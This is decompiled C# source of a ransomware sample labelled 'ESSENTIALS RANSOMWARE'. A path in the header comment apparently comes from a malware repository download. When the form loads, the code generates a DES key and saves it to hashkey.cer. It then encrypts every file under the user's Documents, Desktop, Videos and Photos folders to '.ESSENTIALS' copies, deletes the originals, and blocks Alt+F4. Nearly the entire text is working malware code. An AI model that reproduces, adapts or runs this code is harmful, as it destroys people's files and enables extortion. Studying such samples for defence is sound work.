// Decompiled with JetBrains decompiler
// Type: ARFT.Form1
// Assembly: NML, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C6530F0-58BE-4B8A-8672-57CF622727BA
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Encoder.gen-dd728b0aa7098652681d7bf66076c65f7cbe27fb57329c23065cd5ddf38f42db.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace ARFT
{
  public class Form1 : Form
  {
    public const int iterations = 1042;
    private string ReadFilename;
    private string WriteFilename;
    private string outputFile;
    public readonly byte[] salt = new byte[8];
    private string PassWord = "12345678";
    private byte[] iv = new byte[16];
    private bool On;
    private Point Pos;
    private IContainer components = (IContainer) null;
    private OpenFileDialog openFileDialog1;
    private SaveFileDialog saveFileDialog1;
    private Label label1;
    private Label label2;
    private Label label3;
    private RichTextBox richTextBox1;

    public Form1()
    {
      this.InitializeComponent();
      this.MouseDown += (MouseEventHandler) ((o, e) =>
      {
        if (e.Button != MouseButtons.Left)
          return;
        this.On = true;
        this.Pos = e.Location;
      });
      this.MouseMove += (MouseEventHandler) ((o, e) =>
      {
        if (!this.On)
          return;
        this.Location = new Point(this.Location.X + (e.X - this.Pos.X), this.Location.Y + (e.Y - this.Pos.Y));
      });
      this.MouseUp += (MouseEventHandler) ((o, e) =>
      {
        if (e.Button != MouseButtons.Left)
          return;
        this.On = false;
        this.Pos = e.Location;
      });
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.Region = Region.FromHrgn(Form1.CreateRoundRectRgn(0, 0, this.Width, this.Height, 10, 10));
      File.Delete("C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\hashkey.cer");
      byte[] data = new byte[16];
      using (RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider())
        cryptoServiceProvider.GetBytes(data);
      string contents = BitConverter.ToString(data).Substring(0, 8);
      File.WriteAllText("C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\hashkey.cer", contents, Encoding.Default);
      foreach (string enumerateFile in Directory.EnumerateFiles(Environment.ExpandEnvironmentVariables("C:\\Users\\%username%\\Documents"), "*.*", SearchOption.AllDirectories))
      {
        this.ReadFilename = enumerateFile;
        this.WriteFilename = enumerateFile + ".ESSENTIALS";
        string s = contents;
        FileStream fileStream1 = new FileStream(this.ReadFilename, FileMode.Open, FileAccess.Read, FileShare.None);
        FileStream fileStream2 = new FileStream(this.WriteFilename, FileMode.Create, FileAccess.Write);
        DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
        cryptoServiceProvider.Key = Encoding.Default.GetBytes(s);
        cryptoServiceProvider.IV = Encoding.Default.GetBytes(s);
        ICryptoTransform encryptor = cryptoServiceProvider.CreateEncryptor();
        CryptoStream cryptoStream = new CryptoStream((Stream) fileStream2, encryptor, CryptoStreamMode.Write);
        byte[] buffer = new byte[fileStream1.Length];
        fileStream1.Read(buffer, 0, buffer.Length);
        cryptoStream.Write(buffer, 0, buffer.Length);
        fileStream2.Flush();
        cryptoStream.Close();
        fileStream1.Close();
        fileStream2.Close();
        File.Delete(this.ReadFilename);
      }
      foreach (string enumerateFile in Directory.EnumerateFiles(Environment.ExpandEnvironmentVariables("C:\\Users\\%username%\\Desktop"), "*.*", SearchOption.AllDirectories))
      {
        this.ReadFilename = enumerateFile;
        this.WriteFilename = enumerateFile + ".ESSENTIALS";
        string s = contents;
        FileStream fileStream3 = new FileStream(this.ReadFilename, FileMode.Open, FileAccess.Read, FileShare.None);
        FileStream fileStream4 = new FileStream(this.WriteFilename, FileMode.Create, FileAccess.Write);
        DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
        cryptoServiceProvider.Key = Encoding.Default.GetBytes(s);
        cryptoServiceProvider.IV = Encoding.Default.GetBytes(s);
        ICryptoTransform encryptor = cryptoServiceProvider.CreateEncryptor();
        CryptoStream cryptoStream = new CryptoStream((Stream) fileStream4, encryptor, CryptoStreamMode.Write);
        byte[] buffer = new byte[fileStream3.Length];
        fileStream3.Read(buffer, 0, buffer.Length);
        cryptoStream.Write(buffer, 0, buffer.Length);
        fileStream4.Flush();
        cryptoStream.Close();
        fileStream3.Close();
        fileStream4.Close();
        File.Delete(this.ReadFilename);
      }
      foreach (string enumerateFile in Directory.EnumerateFiles(Environment.ExpandEnvironmentVariables("C:\\Users\\%username%\\Videos"), "*.*", SearchOption.AllDirectories))
      {
        this.ReadFilename = enumerateFile;
        this.WriteFilename = enumerateFile + ".ESSENTIALS";
        string s = contents;
        FileStream fileStream5 = new FileStream(this.ReadFilename, FileMode.Open, FileAccess.Read, FileShare.None);
        FileStream fileStream6 = new FileStream(this.WriteFilename, FileMode.Create, FileAccess.Write);
        DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
        cryptoServiceProvider.Key = Encoding.Default.GetBytes(s);
        cryptoServiceProvider.IV = Encoding.Default.GetBytes(s);
        ICryptoTransform encryptor = cryptoServiceProvider.CreateEncryptor();
        CryptoStream cryptoStream = new CryptoStream((Stream) fileStream6, encryptor, CryptoStreamMode.Write);
        byte[] buffer = new byte[fileStream5.Length];
        fileStream5.Read(buffer, 0, buffer.Length);
        cryptoStream.Write(buffer, 0, buffer.Length);
        fileStream6.Flush();
        cryptoStream.Close();
        fileStream5.Close();
        fileStream6.Close();
        File.Delete(this.ReadFilename);
      }
      foreach (string enumerateFile in Directory.EnumerateFiles(Environment.ExpandEnvironmentVariables("C:\\Users\\%username%\\Photos"), "*.*", SearchOption.AllDirectories))
      {
        this.ReadFilename = enumerateFile;
        this.WriteFilename = enumerateFile + ".ESSENTIALS";
        string s = contents;
        FileStream fileStream7 = new FileStream(this.ReadFilename, FileMode.Open, FileAccess.Read, FileShare.None);
        FileStream fileStream8 = new FileStream(this.WriteFilename, FileMode.Create, FileAccess.Write);
        DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
        cryptoServiceProvider.Key = Encoding.Default.GetBytes(s);
        cryptoServiceProvider.IV = Encoding.Default.GetBytes(s);
        ICryptoTransform encryptor = cryptoServiceProvider.CreateEncryptor();
        CryptoStream cryptoStream = new CryptoStream((Stream) fileStream8, encryptor, CryptoStreamMode.Write);
        byte[] buffer = new byte[fileStream7.Length];
        fileStream7.Read(buffer, 0, buffer.Length);
        cryptoStream.Write(buffer, 0, buffer.Length);
        fileStream8.Flush();
        cryptoStream.Close();
        fileStream7.Close();
        fileStream8.Close();
        File.Delete(this.ReadFilename);
      }
    }

    [DllImport("Gdi32.dll")]
    private static extern IntPtr CreateRoundRectRgn(
      int nLeftRect,
      int nTopRect,
      int nRightRect,
      int nBottomRect,
      int nWidthEllipse,
      int nHeightEllipse);

    private void Form1_KeyDown(object sender, KeyEventArgs e)
    {
      if (!e.Alt || e.KeyCode != Keys.F4)
        return;
      e.Handled = true;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.openFileDialog1 = new OpenFileDialog();
      this.saveFileDialog1 = new SaveFileDialog();
      this.label1 = new Label();
      this.label2 = new Label();
      this.label3 = new Label();
      this.richTextBox1 = new RichTextBox();
      this.SuspendLayout();
      this.openFileDialog1.FileName = "openFileDialog1";
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Brown", 21.8f);
      this.label1.Location = new Point(103, 99);
      this.label1.Name = "label1";
      this.label1.Size = new Size(222, 50);
      this.label1.TabIndex = 0;
      this.label1.Text = "ESSENTIALS";
      this.label2.AutoSize = true;
      this.label2.Font = new Font("Brown", 21.8f);
      this.label2.ForeColor = Color.FromArgb(243, 123, 88);
      this.label2.Location = new Point(313, 99);
      this.label2.Name = "label2";
      this.label2.Size = new Size(281, 50);
      this.label2.TabIndex = 1;
      this.label2.Text = "RANSOMWARE";
      this.label3.AutoSize = true;
      this.label3.Font = new Font("Brown", 7f);
      this.label3.ForeColor = Color.FromArgb(49, 49, 49);
      this.label3.Location = new Point(178, 153);
      this.label3.Name = "label3";
      this.label3.Size = new Size(325, 32);
      this.label3.TabIndex = 2;
      this.label3.Text = "Your important documents, photos, videos are encrypted\r\n**This program is for developer learning purpose only**";
      this.label3.TextAlign = ContentAlignment.TopCenter;
      this.richTextBox1.Font = new Font("Brown", 7.8f);
      this.richTextBox1.Location = new Point(112, 201);
      this.richTextBox1.Name = "richTextBox1";
      this.richTextBox1.Size = new Size(468, 189);
      this.richTextBox1.TabIndex = 3;
      this.richTextBox1.Text = componentResourceManager.GetString("richTextBox1.Text");
      this.AutoScaleDimensions = new SizeF(120f, 120f);
      this.AutoScaleMode = AutoScaleMode.Dpi;
      this.BackColor = Color.White;
      this.ClientSize = new Size(686, 509);
      this.Controls.Add((Control) this.richTextBox1);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.label2);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Name = nameof (Form1);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "NML v1.0 (Personal)";
      this.Load += new EventHandler(this.Form1_Load);
      this.KeyDown += new KeyEventHandler(this.Form1_KeyDown);
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
